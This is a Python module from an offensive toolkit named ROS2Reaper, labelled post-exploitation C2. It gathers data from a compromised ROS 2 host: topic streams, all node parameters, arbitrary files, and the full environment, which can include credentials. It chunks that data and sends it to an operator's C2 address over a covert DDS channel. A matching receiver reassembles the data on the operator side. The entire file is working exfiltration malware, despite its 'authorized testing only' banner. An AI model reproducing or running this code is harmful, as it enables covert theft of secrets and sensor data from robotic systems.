#!/usr/bin/env python3
"""
c2_exfil.py — Data Exfiltration over DDS Covert Channel
=========================================================
ROS2Reaper Phase 4 Module

Streams ROS 2 topic data, parameter values, and sensor output from a
compromised host back to the operator over the covert DDS channel.

Exfil modes:
    topic   — Subscribe to a ROS topic and stream messages to operator
    params  — Dump all ROS 2 parameter values across all nodes
    files   — Read and chunk a file from the target filesystem
    env     — Exfiltrate environment variables and ROS config

Chunking:
    Large payloads are split into 1400-byte chunks (fits UDP MTU without
    fragmentation) and reassembled on the operator side.

Author  : Gh057x
Phase   : 4 — Post-Exploitation / C2
Requires: Python 3.8+ (stdlib only — rclpy optional for topic subscribe)

⚠️  AUTHORIZED SECURITY TESTING ONLY ⚠️
"""

import os
import sys
import time
import socket
import subprocess
import threading
import json
import math
from typing import Optional, Iterator, List

from modules.phase4.c2_channel import (
    C2Transport, C2Packet,
    MsgType, DEFAULT_KEY, _make_session_id,
)

CHUNK_SIZE = 1400   # bytes per exfil packet payload


# ─────────────────────────────────────────────────────────────────────────────
# Chunked payload helpers
# ─────────────────────────────────────────────────────────────────────────────

def _chunk(data: bytes, size: int = CHUNK_SIZE) -> List[bytes]:
    return [data[i:i + size] for i in range(0, max(1, len(data)), size)]


def _collect_topic(topic: str, duration: float = 10.0) -> bytes:
    """Collect ROS 2 topic data via CLI."""
    try:
        result = subprocess.run(
            ["ros2", "topic", "echo", topic],
            capture_output=True, text=True, timeout=duration,
        )
        return result.stdout.encode()[:65536]
    except subprocess.TimeoutExpired as e:
        return (e.stdout or "").encode()[:65536]
    except FileNotFoundError:
        return b"ros2 cli not available"


def _collect_params() -> bytes:
    """Dump all ROS 2 parameters."""
    try:
        result = subprocess.run(
            ["ros2", "param", "dump", "--all"],
            capture_output=True, text=True, timeout=20,
        )
        return result.stdout.encode()[:65536]
    except Exception as e:
        return str(e).encode()


def _collect_file(path: str) -> bytes:
    try:
        with open(path, "rb") as f:
            return f.read(65536)
    except Exception as e:
        return str(e).encode()


def _collect_env() -> bytes:
    env = {k: v for k, v in os.environ.items()}
    return json.dumps(env, indent=2).encode()[:32768]


EXFIL_COLLECTORS = {
    "params": lambda p: _collect_params(),
    "env":    lambda p: _collect_env(),
    "file":   lambda p: _collect_file(p.get("path", "/etc/hostname")),
    "topic":  lambda p: _collect_topic(p.get("topic", "/rosout"), p.get("duration", 10.0)),
}


# ─────────────────────────────────────────────────────────────────────────────
# Exfil sender (runs on compromised host side)
# ─────────────────────────────────────────────────────────────────────────────

class C2Exfiltrator:
    """
    Collects data on the compromised host and streams it to the operator
    via chunked EXFIL packets over the covert DDS channel.
    """

    def __init__(
        self,
        c2_ip:      str,
        session_id: str,
        domain_id:  int   = 0,
        key:        bytes = DEFAULT_KEY,
        verbose:    bool  = False,
    ):
        self.c2_ip      = c2_ip
        self.session_id = session_id
        self.transport  = C2Transport(domain_id=domain_id, key=key)
        self.verbose    = verbose
        self._seq       = 0

    def _log(self, msg: str) -> None:
        if self.verbose:
            print(f"[exfil] {msg}")

    def _next_seq(self) -> int:
        self._seq += 1
        return self._seq

    def send(self, mode: str, params: dict = {}) -> int:
        """
        Collect data for `mode` and send it to the C2 server as chunked EXFIL
        packets. Returns the number of chunks sent.
        """
        collector = EXFIL_COLLECTORS.get(mode)
        if not collector:
            self._log(f"unknown exfil mode: {mode}")
            return 0

        self._log(f"collecting mode={mode}")
        data   = collector(params)
        chunks = _chunk(data)
        total  = len(chunks)
        self._log(f"{len(data)} bytes → {total} chunks")

        for idx, chunk in enumerate(chunks):
            pkt = C2Packet(
                msg_type   = MsgType.EXFIL,
                session_id = self.session_id,
                seq        = self._next_seq(),
                timestamp  = time.time(),
                payload    = {
                    "mode":    mode,
                    "chunk":   idx,
                    "total":   total,
                    "data":    chunk.hex(),
                    "params":  params,
                },
            )
            self.transport.send_unicast(self.c2_ip, pkt)
            time.sleep(0.01)    # ~100 chunks/sec — avoids UDP bursting

        self._log(f"sent {total} chunks")
        return total


# ─────────────────────────────────────────────────────────────────────────────
# Exfil receiver (runs on operator C2 server side)
# ─────────────────────────────────────────────────────────────────────────────

class ExfilReceiver:
    """
    Listens for EXFIL packets from a specific session and reassembles chunks
    into the original payload.
    """

    def __init__(
        self,
        session_id: str,
        domain_id:  int   = 0,
        key:        bytes = DEFAULT_KEY,
        timeout:    float = 60.0,
        verbose:    bool  = False,
    ):
        self.session_id = session_id
        self.transport  = C2Transport(domain_id=domain_id, key=key)
        self.timeout    = timeout
        self.verbose    = verbose
        self._chunks: dict = {}     # {chunk_idx: bytes}
        self._total:  Optional[int] = None
        self._stop    = threading.Event()

    def _log(self, msg: str) -> None:
        if self.verbose:
            print(f"[recv] {msg}")

    def _on_packet(self, pkt: C2Packet, src_ip: str) -> None:
        if pkt.session_id != self.session_id or pkt.msg_type != MsgType.EXFIL:
            return
        p = pkt.payload
        idx   = p.get("chunk", 0)
        total = p.get("total", 1)
        data  = bytes.fromhex(p.get("data", ""))
        self._chunks[idx] = data
        self._total       = total
        self._log(f"chunk {idx+1}/{total} ({len(data)}B)")
        if len(self._chunks) >= total:
            self._stop.set()

    def receive(self) -> Optional[bytes]:
        """Block until all chunks received or timeout. Returns reassembled bytes."""
        port = self.transport._user_port()
        t = threading.Thread(
            target=self.transport.listen,
            args=(port, self._on_packet, self._stop, False),
            daemon=True,
        )
        t.start()
        self._stop.wait(timeout=self.timeout)
        self._stop.set()

        if self._total is None or len(self._chunks) < self._total:
            self._log(f"incomplete: {len(self._chunks)}/{self._total or '?'} chunks")
            return None

        return b"".join(self._chunks[i] for i in sorted(self._chunks))


# ─────────────────────────────────────────────────────────────────────────────
# Entry points
# ─────────────────────────────────────────────────────────────────────────────

def run_exfil(
    c2_ip:      str,
    session_id: str,
    mode:       str,
    params:     dict  = {},
    domain_id:  int   = 0,
    key:        bytes = DEFAULT_KEY,
    verbose:    bool  = False,
) -> None:
    exfil = C2Exfiltrator(
        c2_ip      = c2_ip,
        session_id = session_id,
        domain_id  = domain_id,
        key        = key,
        verbose    = verbose,
    )
    exfil.send(mode, params)


def run_exfil_receive(
    session_id: str,
    output:     Optional[str] = None,
    domain_id:  int   = 0,
    key:        bytes = DEFAULT_KEY,
    timeout:    float = 60.0,
    verbose:    bool  = False,
) -> None:
    print(f"[*] Listening for exfil from session {session_id} (timeout {timeout}s)...")
    receiver = ExfilReceiver(
        session_id = session_id,
        domain_id  = domain_id,
        key        = key,
        timeout    = timeout,
        verbose    = verbose,
    )
    data = receiver.receive()
    if data is None:
        print("[-] Exfil receive failed or timed out")
        return

    print(f"[+] Received {len(data)} bytes")
    if output:
        with open(output, "wb") as f:
            f.write(data)
        print(f"[*] Saved to {output}")
    else:
        try:
            print(data.decode(errors="replace"))
        except Exception:
            print(data.hex())
